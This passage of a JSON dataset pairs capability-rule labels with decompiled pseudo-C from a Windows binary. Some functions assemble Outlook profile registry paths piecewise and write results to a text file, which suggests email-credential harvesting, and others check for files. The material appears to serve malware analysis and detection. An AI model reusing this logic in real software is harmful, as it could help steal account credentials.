200;\n    fcn.00408f20(\"les\\\\9375CFF0413111d3\");\n    var_4h._0_1_ = 0xc9;\n    fcn.00408f20(\"saging Subsystem\\\\Profi\");\n    var_4h._0_1_ = 0xca;\n    uVar1 = fcn.00408f20(\"osoft\\\\Windows Mes\");\n    var_4h._0_1_ = 0xcb;\n    fcn.00409750(uVar1);\n    var_4h._0_1_ = 0xcc;\n    fcn.004097a0(&var_230h);\n    var_4h._0_1_ = 0xcd;\n    fcn.004097a0(&var_214h);\n    var_4h._0_1_ = 0xce;\n    puVar2 = fcn.004097a0(auStack592);\n    var_4h = CONCAT31(var_4h._1_3_, 0xcf);\n    if (0xf < puVar2[5]) {\n        puVar2 = *puVar2;\n    }\n    fcn.004053b0(puVar2);\n    fcn.00408f80();\n    fcn.00408f80();\n    fcn.00408f80();\n    fcn.00408f80();\n    fcn.00408f80();\n    fcn.00408f80();\n    fcn.00408f80();\n    var_4h = 0xffffffff;\n    fcn.00408f80();\n    fcn.00408f20(\"B88A00104B2A6676\\\\00000002\");\n    var_4h = 0xd0;\n    fcn.00408f20(\"les\\\\9375CFF0413111d3\");\n    var_4h._0_1_ = 0xd1;\n    fcn.00408f20(\"saging Subsystem\\\\Profi\");\n    var_4h._0_1_ = 0xd2;\n    uVar1 = fcn.00408f20(\"osoft\\\\Windows Mes\");\n    var_4h._0_1_ = 0xd3;\n    fcn.00409750(uVar1);\n    var_4h._0_1_ = 0xd4;\n    fcn.004097a0(&var_230h);\n    var_4h._0_1_ = 0xd5;\n    fcn.004097a0(&var_214h);\n    var_4h._0_1_ = 0xd6;\n    puVar2 = fcn.004097a0(auStack592);\n    var_4h = CONCAT31(var_4h._1_3_, 0xd7);\n    if (0xf < puVar2[5]) {\n        puVar2 = *puVar2;\n    }\n    fcn.004053b0(puVar2);\n    fcn.00408f80();\n    fcn.00408f80();\n    fcn.00408f80();\n    fcn.00408f80();\n    fcn.00408f80();\n    fcn.00408f80();\n    fcn.00408f80();\n    var_4h = 0xffffffff;\n    fcn.00408f80();\n    fcn.00408f20(\"B88A00104B2A6676\\\\00000003\");\n    var_4h = 0xd8;\n    fcn.00408f20(\"les\\\\9375CFF0413111d3\");\n    var_4h._0_1_ = 0xd9;\n    fcn.00408f20(\"saging Subsystem\\\\Profi\");\n    var_4h._0_1_ = 0xda;\n    uVar1 = fcn.00408f20(\"osoft\\\\Windows Mes\");\n    var_4h._0_1_ = 0xdb;\n    fcn.00409750(uVar1);\n    var_4h._0_1_ = 0xdc;\n    fcn.004097a0(&var_230h);\n    var_4h._0_1_ = 0xdd;\n    fcn.004097a0(&var_214h);\n    var_4h._0_1_ = 0xde;\n    puVar2 = fcn.004097a0(auStack592);\n    var_4h = CONCAT31(var_4h._1_3_, 0xdf);\n    if (0xf < puVar2[5]) {\n        puVar2 = *puVar2;\n    }\n    fcn.004053b0(puVar2);\n    fcn.00408f80();\n    fcn.00408f80();\n    fcn.00408f80();\n    fcn.00408f80();\n    fcn.00408f80();\n    fcn.00408f80();\n    fcn.00408f80();\n    var_4h = 0xffffffff;\n    fcn.00408f80();\n    fcn.00408f20(\"B88A00104B2A6676\\\\00000004\");\n    var_4h = 0xe0;\n    fcn.00408f20(\"les\\\\9375CFF0413111d3\");\n    var_4h._0_1_ = 0xe1;\n    fcn.00408f20(\"saging Subsystem\\\\Profi\");\n    var_4h._0_1_ = 0xe2;\n    uVar1 = fcn.00408f20(\"osoft\\\\Windows Mes\");\n    var_4h._0_1_ = 0xe3;\n    fcn.00409750(uVar1);\n    var_4h._0_1_ = 0xe4;\n    fcn.004097a0(auStack620);\n    var_4h._0_1_ = 0xe5;\n    fcn.004097a0(auStack648);\n    var_4h._0_1_ = 0xe6;\n    puVar2 = fcn.004097a0(auStack788);\n    var_4h = CONCAT31(var_4h._1_3_, 0xe7);\n    if (0xf < puVar2[5]) {\n        puVar2 = *puVar2;\n    }\n    fcn.004053b0(puVar2);\n    fcn.00408f80();\n    fcn.00408f80();\n    fcn.00408f80();\n    fcn.00408f80();\n    fcn.00408f80();\n    fcn.00408f80();\n    fcn.00408f80();\n    var_4h = 0xffffffff;\n    fcn.00408f80();\n    fcn.00434d30(auStack284, 0, 0x104);\n    (**0x457520)(auStack284, 0x44c8cc);\n    (**0x457520)(auStack284, 0x44c8d0);\n    arg_8h = \"look\";\n    (**0x457520)(auStack284);\n    (**0x457520)(auStack284, \".txt\");\n    uVar1 = (**0x457418)(*0x4572d4);\n    fcn.0042ca60(*0x4572d4, uVar1);\n    *0x4572d4 = 0;\n    *in_FS_OFFSET = var_ch;\n    fcn.0042d636(arg_8h);\n    return;\n}\n",
        "token_count": 22595
    },
    "004096e0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004096e0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    code *var_ch;\n    \n    iVar1 = 0;\n    if ((arg_8h != 0) && (iVar1 = fcn.0042ddfe(arg_8h),  iVar1 == 0)) {\n        arg_8h = 0;\n        fcn.0042d7ec(&arg_8h);\n        var_ch = vtable.std::bad_alloc.0;\n        iVar1 = fcn.0042f5f6(&var_ch, 0x4510e8);\n    }\n    return iVar1;\n}\n",
        "token_count": 149
    },
    "0040d580": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040d580(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t *piVar2;\n    ushort *puVar3;\n    int32_t iVar4;\n    int32_t *unaff_ESI;\n    \n    if ((*unaff_ESI == 0) && (unaff_ESI[1] == -1)) {\n        piVar2 = unaff_ESI + 0x50;\n        (**0x457398)(0x103, piVar2);\n        do {\n            cVar1 = *piVar2;\n            piVar2 = piVar2 + 1;\n        } while (cVar1 != '\\0');\n        cVar1 = (piVar2 + (0x13f - (unaff_ESI + 0x141)))[unaff_ESI];\n        if ((cVar1 != '\\\\') && (cVar1 != '/')) {\n            *(piVar2 + (0x140 - (unaff_ESI + 0x141)) + unaff_ESI) = 0x2f;\n        }\n        puVar3 = fcn.0042ddfe(0x20);\n        *puVar3 = 0x100;\n        *(puVar3 + 8) = 0;\n        *(puVar3 + 10) = arg_8h;\n        *(puVar3 + 0xc) = arg_ch;\n        *(puVar3 + 0xe) = 0;\n        *(puVar3 + 6) = 0;\n        iVar4 = fcn.0040c6e0();\n        *unaff_ESI = iVar4;\n        return (-(iVar4 != 0) & 0xfffffe00) + 0x200;\n    }\n    return 0x1000000;\n}\n",
        "token_count": 399
    },
    "0040dcc0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_114h\n\nvoid __cdecl fcn.0040dcc0(char *arg_8h)\n\n{\n    char cVar1;\n    uint arg_8h_00;\n    int32_t iVar2;\n    uint *in_ECX;\n    int32_t *in_EDX;\n    uint *unaff_EBX;\n    uint unaff_ESI;\n    uint var_114h;\n    uint var_110h;\n    uint32_t var_4h;\n    \n    var_4h = *0x454664 ^ &stack0xfffffffc;\n    iVar2 = &var_110h - arg_8h;\n    do {\n        cVar1 = *arg_8h;\n        arg_8h[iVar2] = cVar1;\n        arg_8h = arg_8h + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = fcn.0040ccc0(2);\n    if (iVar2 == 0) {\n        if (in_EDX[1] != -1) {\n            fcn.0040d4a0();\n        }\n        in_EDX[1] = -1;\n        arg_8h_00 = *(*in_EDX + 0x10);\n        if (unaff_EBX != NULL) {\n            *unaff_EBX = arg_8h_00;\n        }\n        if (in_ECX != NULL) {\n            fcn.0040d620(arg_8h_00);\n        }\n        fcn.0042d636(unaff_ESI);\n        return;\n    }\n    if (unaff_EBX != NULL) {\n        *unaff_EBX = 0xffffffff;\n    }\n    if (in_ECX != NULL) {\n        fcn.00434d30(in_ECX, 0, 300);\n        *in_ECX = 0xffffffff;\n    }\n    fcn.0042d636(in_ECX);\n    return;\n}\n",
        "token_count": 429
    },
    "0040edb0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040f20d)\n// WARNING: Removing unreachable block (ram,0x0040f225)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040edb0(uint arg_8h)\n\n{\n    char cVar1;\n    bool bVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    char *pcVar6;\n    char *in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    uint var_b9ch;\n    uint var_b98h;\n    uint var_b94h;\n    uint var_b90h;\n    uint var_b8ch;\n    uint var_b88h;\n    uint32_t var_b6ch;\n    uint var_b5ch;\n    uint32_t var_b58h;\n    uint32_t var_b50h;\n    uint var_b40h;\n    uint32_t var_b3ch;\n    uint32_t var_b34h;\n    uint var_b24h;\n    uint32_t var_b20h;\n    uint32_t var_b18h;\n    uint var_b08h;\n    uint32_t var_b04h;\n    uint var_afch;\n    uint var_714h;\n    uint var_32ch;\n    uint var_224h;\n    uint var_11ch;\n    uint32_t var_14h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x442827;\n    var_ch = *in_FS_OFFSET;\n    var_14h = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    fcn.00434d30(&var_224h, 0, 0x104, var_14h);\n    fcn.00434d30(&var_11ch, 0, 0x104);\n    fcn.00434d30(&var_afch, 0, 1000);\n    iVar3 = (**0x457500)(0, 0x1a, 0, 0, &var_afch);\n    (**0x457520)(&var_224h, &var_afch & (iVar3 < 0) - 1);\n    (**0x457520)(&var_224h, *0x456dbc);\n    (**0x457520)(&var_11ch, &var_224h);\n    (**0x457520)(&var_11ch, 0x44c8cc);\n    arg_8h_00 = &var_11ch;\n    (**0x457520)(arg_8h_00, *0x456d54);\n    puVar4 = &var_11ch;\n    var_b3ch = 0xf;\n    var_b40h = 0;\n    var_b50h = var_b50h & 0xffffff00;\n    do {\n        cVar1 = *puVar4;\n        puVar4 = puVar4 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(&var_11ch, puVar4 - (&var_11ch + 1));\n    var_4h = 0;\n    puVar4 = fcn.00424130(&var_b6ch);\n    if (7 < puVar4[5]) {\n        puVar4 = *puVar4;\n    }\n    uVar5 = (**0x457364)(puVar4);\n    if ((uVar5 == 0xffffffff) || ((uVar5 & 0x10) != 0)) {\n        bVar2 = false;\n    }\n    else {\n        bVar2 = true;\n    }\n    if (7 < var_b58h) {\n        fcn.0042d62b(var_b6ch);\n    }\n    var_4h = 0xffffffff;\n    var_b58h = 7;\n    var_b5ch = 0;\n    var_b6ch = var_b6ch & 0xffff0000;\n    if (0xf < var_b3ch) {\n        fcn.0042d62b(var_b50h);\n    }\n    var_b3ch = 0xf;\n    var_b40h = 0;\n    var_b50h = var_b50h & 0xffffff00;\n    if ((bVar2) && (iVar3 = fcn.00418aa0(&var_11ch),  iVar3 != 0)) {\n        var_b20h = 0xf;\n        var_b24h = 0;\n        var_b34h = var_b34h & 0xffffff00;\n        pcVar6 = in_ECX;\n        do {\n            cVar1 = *pcVar6;\n            pcVar6 = pcVar6 + 1;\n        } while (cVar1 != '\\0');\n        fcn.004090e0(in_ECX, pcVar6 - (in_ECX + 1));\n        var_4h = 1;\n        fcn.00423c70(&var_b18h, &var_b34h);\n        var_4h._0_1_ = 3;\n        if (0xf < var_b20h) {\n            fcn.0042d62b(var_b34h);\n        }\n        var_b20h = 0xf;\n        var_b24h = 0;\n        var_b34h = var_b34h & 0xffffff00;\n        fcn.00434d30(&var_32ch, 0, 0x104);\n        (**0x457520)(&var_32ch, *0x456a94);\n        puVar4 = &var_32ch;\n        do {\n            cVar1 = *puVar4;\n            puVar4 = puVar4 + 1;\n        } while (cVar1 != '\\0');\n        iVar3 = fcn.004149c0(&var_b18h, &var_32ch, puVar4 - (&var_32ch + 1));\n        if (iVar3 != -1) {\n            fcn.004094e0(0, iVar3 + 0xc);\n            fcn.004094e0(0x8c, 0xffffffff);\n            iVar3 = fcn.00418950();\n            if (iVar3 != 0) {\n                fcn.00434d30(&var_714h, 0, 1000);\n                puVar4 = fcn.00418cb0(0, 0);\n                var_4h._0_1_ = 4;\n                if (0xf < puVar4[5]) {\n                    puVar4 = *puVar4;\n                }\n                (**0x457520)(&var_714h, puVar4);\n                var_4h._0_1_ = 3;\n                fcn.00408f80();\n                (**0x457520)(arg_8h, *0x456f1c);\n                iVar3 = (**0x457550)(&var_714h, \"NULL\");\n                if (iVar3 != 0) {\n                    puVar4 = fcn.00418cb0(0, 0);\n                    var_4h._0_1_ = 5;\n                    if (0xf < puVar4[5]) {\n                        puVar4 = *puVar4;\n                    }\n                    (**0x457520)(arg_8h, puVar4);\n                    var_4h._0_1_ = 3;\n                    fcn.00408f80();\n                }\n                (**0x457520)(arg_8h, 0x44c738);\n            }\n        }\n        var_4h = 0xffffffff;\n        if (0xf < var_b04h) {\n            fcn.0042d62b(var_b18h);\n        }\n        var_b04h = 0xf;\n        var_b08h = 0;\n        var_b18h = var_b18h & 0xffffff00;\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042d636(arg_8h_00);\n    return;\n}\n",
        "token_count": 1796
    },
    "0040f4b0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h_2\n\nvoid fcn.0040f4b0(void)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    int32_t arg_ch;\n    uint var_4h;\n    uint var_1f48h;\n    uint var_1b60h;\n    uint var_1778h;\n    uchar auStackY5012 [240];\n    uint var_1390h;\n    uint var_fa8h_2;\n    uint var_fa8h_3;\n    uint var_fa8h;\n    uint var_bc0h_2;\n    uint var_bc0h;\n    uint var_7d8h_2;\n    uint var_7d8h;\n    uint var_3f0h;\n    uint uStackY260;\n    uint32_t in_stack_ffffff08;\n    uint32_t in_stack_ffffff0c;\n    uint in_stack_ffffff10;\n    uint in_stack_ffffff14;\n    uint in_stack_ffffff18;\n    uchar *arg_8h;\n    uint var_4h_2;\n    \n    fcn.0043c480();\n    fcn.00434d30();\n    fcn.00434d30();\n    fcn.00434d30();\n    fcn.00434d30();\n    fcn.00434d30();\n    fcn.00434d30();\n    fcn.00434d30();\n    fcn.00434d30();\n    fcn.00434d30();\n    (**0x457520)();\n    (**0x457520)();\n    (**0x457520)();\n    (**0x457520)();\n    (**0x457520)();\n    (**0x457520)();\n    (**0x457520)();\n    (**0x457520)();\n    (**0x457520)();\n    (**0x457520)();\n    (**0x457520)();\n    (**0x457520)();\n    (**0x457520)();\n    (**0x457520)();\n    (**0x457520)();\n    (**0x457520)();\n    (**0x457520)();\n    (**0x457520)();\n    (**0x457520)();\n    (**0x457520)();\n    (**0x457520)();\n    (**0x457520)();\n    (**0x457520)();\n    (**0x457520)();\n    arg_8h = &stack0xffffec6c;\n    (**0x457520)();\n    uVar2 = (**0x457470)();\n    if ((uVar2 != 0xffffffff) && ((uVar2 & 0x10) == 0)) {\n        puVar3 = &fcn.0040f4b0::var_fa8h_3;\n        in_stack_ffffff0c = in_stack_ffffff0c & 0xffffff00;\n        do {\n            cVar1 = *puVar3;\n            puVar3 = puVar3 + 1;\n        } while (cVar1 != '\\0');\n        in_stack_ffffff08 = puVar3 - (&fcn.0040f4b0::var_fa8h_3 + 1);\n        puVar3 = &fcn.0040f4b0::var_fa8h_3;\n        fcn.004090e0(puVar3, in_stack_ffffff08);\n        fcn.0040f250(puVar3, in_stack_ffffff08, in_stack_ffffff0c, in_stack_ffffff10, in_stack_ffffff14, \n                     in_stack_ffffff18);\n    }\n    uVar2 = (**0x457470)();\n    if ((uVar2 != 0xffffffff) && ((uVar2 & 0x10) == 0)) {\n        puVar3 = &fcn.0040f4b0::var_fa8h_3;\n        in_stack_ffffff08 = in_stack_ffffff08 & 0xffffff00;\n        do {\n            cVar1 = *puVar3;\n            puVar3 = puVar3 + 1;\n        } while (cVar1 != '\\0');\n        arg_ch = puVar3 - (&fcn.0040f4b0::var_fa8h_3 + 1);\n        puVar3 = &fcn.0040f4b0::var_fa8h_3;\n        uStackY260 = 0x40f816;\n        fcn.004090e0(puVar3, arg_ch);\n        uStackY260 = 0x40f81b;\n        fcn.0040f250(puVar3, arg_ch, in_stack_ffffff08, in_stack_ffffff0c, in_stack_ffffff10, in_stack_ffffff14);\n    }\n    fcn.0042d636(arg_8h);\n    return;\n}\n",
        "token_count": 1033
    },
    "0040fa30": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040fa30(uint arg_8h, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint32_t arg_1ch)\n\n{\n    char cVar1;\n    char *pcVar2;\n    int32_t *in_FS_OFFSET;\n    char *arg_8h_00;\n    uint32_t var_2ch;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x441978;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_4h = 0;\n    var_18h = 0xf;\n    var_1ch = 0;\n    var_2ch = var_2ch & 0xffffff00;\n    fcn.004092e0(&arg_8h, 0, 0xffffffff);\n    fcn.004149c0(&var_2ch, 0x44ebb0, 0xb);\n    fcn.004149c0(&var_2ch, 0x44ebbc, 0xc);\n    fcn.004149c0(&var_2ch, \"C:\\\\\\\\\\\\Windows\\\\\", 0xd);\n    pcVar2 = *0x4571b4;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004149c0(&var_2ch, *0x4571b4, pcVar2 - (*0x4571b4 + 1));\n    pcVar2 = *0x4570b8;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004149c0(&var_2ch, *0x4570b8, pcVar2 - (*0x4570b8 + 1));\n    pcVar2 = *0x4570c4;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004149c0(&var_2ch, *0x4570c4, pcVar2 - (*0x4570c4 + 1));\n    pcVar2 = *0x456d9c;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004149c0(&var_2ch, *0x456d9c, pcVar2 - (*0x456d9c + 1));\n    pcVar2 = *0x456e54;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004149c0(&var_2ch, *0x456e54, pcVar2 - (*0x456e54 + 1));\n    pcVar2 = *0x4570d8;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004149c0(&var_2ch, *0x4570d8, pcVar2 - (*0x4570d8 + 1));\n    pcVar2 = *0x456bd8;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004149c0(&var_2ch, *0x456bd8, pcVar2 - (*0x456bd8 + 1));\n    pcVar2 = *0x457018;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004149c0(&var_2ch, *0x457018, pcVar2 - (*0x457018 + 1));\n    pcVar2 = *0x456d58;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004149c0(&var_2ch, *0x456d58, pcVar2 - (*0x456d58 + 1));\n    pcVar2 = *0x456f44;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004149c0(&var_2ch, *0x456f44, pcVar2 - (*0x456f44 + 1));\n    pcVar2 = *0x456ec8;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004149c0(&var_2ch, *0x456ec8, pcVar2 - (*0x456ec8 + 1));\n    pcVar2 = *0x457270;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004149c0(&var_2ch, *0x457270, pcVar2 - (*0x457270 + 1));\n    pcVar2 = *0x456fec;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004149c0(&var_2ch, *0x456fec, pcVar2 - (*0x456fec + 1));\n    pcVar2 = *0x45707c;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004149c0(&var_2ch, *0x45707c, pcVar2 - (*0x45707c + 1));\n    pcVar2 = *0x456df0;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004149c0(&var_2ch, *0x456df0, pcVar2 - (*0x456df0 + 1));\n    pcVar2 = *0x456ec4;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004149c0(&var_2ch, *0x456ec4, pcVar2 - (*0x456ec4 + 1));\n    pcVar2 = *0x456bd4;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004149c0(&var_2ch, *0x456bd4, pcVar2 - (*0x456bd4 + 1));\n    pcVar2 = *0x456ab0;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004149c0(&var_2ch, *0x456ab0, pcVar2 - (*0x456ab0 + 1));\n    pcVar2 = *0x456c40;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    arg_8h_00 = *0x456c40;\n    fcn.004149c0(&var_2ch, *0x456c40, pcVar2 - (*0x456c40 + 1));\n    pcVar2 = *0x4570d4;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004149c0(&var_2ch, *0x4570d4, pcVar2 - (*0x4570d4 + 1));\n    if (0xf < var_18h) {\n        fcn.0042d62b(var_2ch);\n    }\n    var_18h = 0xf;\n    var_1ch = 0;\n    var_2ch = var_2ch & 0xffffff00;\n    if (0xf < arg_1ch) {\n        fcn.0042d62b(arg_8h);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042d636(arg_8h_00);\n    return;\n}\n",
        "token_count": 2128
    },
    "00411320": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.00411320(uchar *arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t **in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t **ppiVar4;\n    int32_t **var_4h;\n    \n    iVar2 = fcn.00414a70(4);\n    iVar3 = fcn.00414ae0();\n    piVar1 = in_EAX[5];\n    if (iVar2 == -1) {\n        ppiVar4 = in_EAX;\n        if (0xf < piVar1) {\n            ppiVar4 = *in_EAX;\n        }\n    }\n    else {\n        ppiVar4 = in_EAX;\n        if (0xf < piVar1) {\n            ppiVar4 = *in_EAX;\n        }\n        ppiVar4 = ppiVar4 + iVar2;\n    }\n    if (iVar3 == -1) {\n        if (piVar1 < 0x10) {\n            var_4h = in_EAX[4] + in_EAX;\n        }\n        else {\n            var_4h = in_EAX[4] + *in_EAX;\n        }\n    }\n    else {\n        if (0xf < piVar1) {\n            in_EAX = *in_EAX;\n        }\n        var_4h = in_EAX + iVar3 + 1;\n    }\n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    if (ppiVar4 != var_4h) {\n        fcn.004090e0(ppiVar4, var_4h - ppiVar4);\n    }\n    return arg_8h;\n}\n",
        "token_count": 407
    },
    "00414ae0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00414af0)\n\nint32_t fcn.00414ae0(void)\n\n{\n    uint *in_EAX;\n    uint *puVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    char *pcVar4;\n    \n    if (in_EAX[4] != 0) {\n        puVar1 = in_EAX;\n        if (0xf < in_EAX[5]) {\n            puVar1 = *in_EAX;\n        }\n        pcVar4 = puVar1 + in_EAX[4] + -1;\n        iVar2 = fcn.0042e260(\" \\n\\r\\t\", *pcVar4);\n        while( true ) {\n            if (iVar2 == 0) {\n                if (0xf < in_EAX[5]) {\n                    in_EAX = *in_EAX;\n                }\n                return pcVar4 - in_EAX;\n            }\n            pcVar3 = fcn.00409060();\n            if (pcVar4 == pcVar3) break;\n            pcVar3 = pcVar4 + -1;\n            pcVar4 = pcVar4 + -1;\n            iVar2 = fcn.0042e260(\" \\n\\r\\t\", *pcVar3);\n        }\n    }\n    return -1;\n}\n",
        "token_count": 289
    },
    "004181b0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004181b0(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    fcn.0042d14d(0);\n    iVar1 = *(param_1 + 4);\n    if ((iVar1 != 0) && (iVar1 != -1)) {\n        *(param_1 + 4) = iVar1 + -1;\n    }\n    iVar1 = *(param_1 + 4);\n    fcn.0042d175();\n    return ~-(iVar1 != 0) & param_1;\n}\n",
        "token_count": 133
    },
    "00418200": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00418200(uint32_t *param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_4h;\n    \n    uVar1 = *param_1;\n    if (uVar1 != 0) {\n        fcn.0042d14d(0);\n        iVar2 = *(uVar1 + 4);\n        if ((iVar2 != 0) && (iVar2 != -1)) {\n            *(uVar1 + 4) = iVar2 + -1;\n        }\n        iVar2 = *(uVar1 + 4);\n        fcn.0042d175();\n        puVar3 = ~-(iVar2 != 0) & uVar1;\n        if (puVar3 != NULL) {\n            (***puVar3)(1);\n        }\n    }\n    return;\n}\n",
        "token_count": 196
    },
    "004185d0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.004185d0(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t *unaff_EDI;\n    uint var_4h;\n    \n    iVar1 = **(in_EAX + 0x30);\n    *unaff_EDI = iVar1;\n    fcn.0042d14d(0);\n    if (*(iVar1 + 4) != -1) {\n        *(iVar1 + 4) = *(iVar1 + 4) + 1;\n    }\n    fcn.0042d175();\n    return;\n}\n",
        "token_count": 131
    },
    "00418610": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
